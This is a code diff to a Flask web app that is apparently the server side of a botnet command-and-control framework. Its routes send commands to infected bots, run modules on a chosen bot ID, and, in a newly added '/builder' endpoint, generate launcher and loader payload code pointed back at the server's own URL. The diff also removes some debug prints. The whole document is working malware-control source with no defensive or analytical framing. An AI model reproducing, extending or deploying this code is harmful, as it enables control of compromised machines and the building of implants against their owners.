@@ -7,7 +7,7 @@ from random import randint
 from binascii import unhexlify
 from time import strftime, localtime
 #built Modules
-from server.starter import login,rhandler,web
+from server.starter import login,rhandler,web,builld
 # Flask constructor takes the name of 
 # current module (__name__) as argument.
 
@@ -44,7 +44,7 @@ def index():
 @app.route('/sendcommand',methods=['GET', 'POST'])
 def sendcommand():
     response = rhandler.do_GET(request.cookies)
-    print(response)
+    #print(response)
     return response
 
 
@@ -71,20 +71,21 @@ def cp(bot_uid):
             keys = web.getPostKeyName(query['select_modules'])
             print(keys)
             setoptions = []
+            run = False
             if keys!= []:
                 for key in keys:
                     if key in query:
                         setoptions.append(query[key]) 
                         print("key is in query ","\n"*5)   
-                        modres = web.runModule(set_options=setoptions,module_name=query['select_modules'],bot_uid=bot_uid)
+                        run = True
                 else:
                     pass
+                if run:
+                    web.runModule(set_options=setoptions,module_name=query['select_modules'],bot_uid=bot_uid)
             else:
-                print("Keys are empty")
-                modres = web.runModule(set_options=setoptions,module_name=query['select_modules'],bot_uid=bot_uid)
-                print(modres)
+                web.runModule(set_options=setoptions,module_name=query['select_modules'],bot_uid=bot_uid)
     
-    return render_template('controlpanel.html', command_type=command_type, module_type=module_type,bot_uid=bot_uid,modules_list=web.get_module_list,infos=info,modres=modres)
+    return render_template('controlpanel.html', command_type=command_type, module_type=module_type,bot_uid=bot_uid,modules_list=web.get_module_list,infos=info)
 
 
 # @app.route('/get_responses')
@@ -110,6 +111,48 @@ def getResponse():
 def logout():
     session.pop("username", None)
     return render_template("login.html")
+
+@app.route("/builder",methods=['GET', 'POST'])
+def builder():
+    launcher_name = request.form.get('launcher_name')
+    loader_name = request.form.get('loader_name')
+    res = ""
+    extensions = ""
+    if loader_name == None or loader_name=="none_selected":
+        loader_info = []
+    else:
+        loader_info = builld.loader_infos(loader_name)
+    
+    if request.method == "POST":
+        query = request.form
+        print("\n"*8,query)
+        setoptions=[]
+        server_host = request.root_url
+        
+        extensions = ""
+        if query['loader_name'] != "none_selected":
+            keys = builld.getPostKeyName(query['loader_name'])
+            run = False
+            if keys!= []:
+                for key in keys:
+                    if key in query:
+                            if query[key] != "RemoveMe":
+                                print(query)
+                                setoptions.append(query[key])
+                                run = True
+                            else:
+                                run = False
+                if run:
+                    res,extensions = builld.builder(launcher_name,loader_name,setoptions,query['karavas_location'],server_host)
+                    code = res
+                    response = {
+                        'success': True,
+                        'generated_code': res,
+                        'extension':extensions
+                    }
+                    return jsonify(response)
+
+    return render_template("Builder.html",lauchers_list=builld.launcher_list,loaders_list=builld.loader_list,Loaderinfos=loader_info,loader_name=loader_name)
 
 if __name__ == '__main__':
 
